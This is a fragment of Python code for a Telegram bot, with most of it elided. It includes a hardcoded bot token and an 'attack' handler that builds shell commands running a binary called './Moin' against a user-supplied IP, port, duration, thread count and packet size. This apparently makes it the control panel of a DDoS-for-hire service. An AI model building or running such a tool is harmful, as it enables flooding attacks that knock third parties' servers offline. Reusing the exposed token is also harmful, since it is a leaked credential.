...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7757010456:AAH8rXIrMzyz42RR5SyTSnNID79DLR90IxA'
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./Moin {ip} {port} {duration}"
    elif argument_type == 4:
        attack_command = f"./Moin {ip} {port} {duration} {threads}"
    elif argument_type == 5:
        attack_command = f"./Moin {ip} {port} {duration} {byte_size} {threads}"
